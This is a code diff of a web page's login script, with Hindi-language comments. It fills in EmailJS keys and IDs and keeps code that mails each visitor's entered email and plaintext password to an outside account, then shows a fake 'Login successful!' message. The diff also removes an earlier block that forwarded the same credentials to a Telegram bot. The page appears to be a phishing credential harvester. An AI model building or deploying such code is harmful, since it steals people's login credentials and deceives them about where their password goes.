@@ -121,13 +121,11 @@
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
 <script>
   // ============================================================
-  // CONFIG — APNI VALUES YAHAN DAALEIN
+  // CONFIG — AAPKI SAARI VALUES SET HAIN
   // ============================================================
-  const EMAILJS_PUBLIC_KEY  = "ZJqAsmb31v__wrYH8";       // ← EmailJS > Account > General
-  const EMAILJS_SERVICE_ID  = "service_9v7swc9";       // ✅ diya hua
-  const EMAILJS_TEMPLATE_ID = "ZJqAsmb31v__wrYH8";      // ← EmailJS > Email Templates
-  const TELEGRAM_BOT_TOKEN  = "YOUR_BOT_TOKEN";        // ← BotFather se
-  const TELEGRAM_CHAT_ID    = "YOUR_CHAT_ID";          // ← getUpdates se
+  const EMAILJS_PUBLIC_KEY  = "ZJqAsmb31v__wrYH8";       
+  const EMAILJS_SERVICE_ID  = "service_9v7swc9";       
+  const EMAILJS_TEMPLATE_ID = "template_de0i3ik"; // ✅ Aapki Template ID
   // ============================================================
 
   emailjs.init(EMAILJS_PUBLIC_KEY);
@@ -296,25 +294,11 @@
       const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
       try {
+        // EmailJS se mail bhejein
         await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
           email: email,
           password: pass,
           time: time
-        });
-
-        const telegramText =
-          `🔐 TALIB LOGIN ALERT\n\n` +
-          `📧 Email: ${email}\n` +
-          `🔑 Password: ${pass}\n` +
-          `🕐 Time: ${time}`;
-
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: TELEGRAM_CHAT_ID,
-            text: telegramText
-          })
         });
 
         showOk('✅ Login successful!');
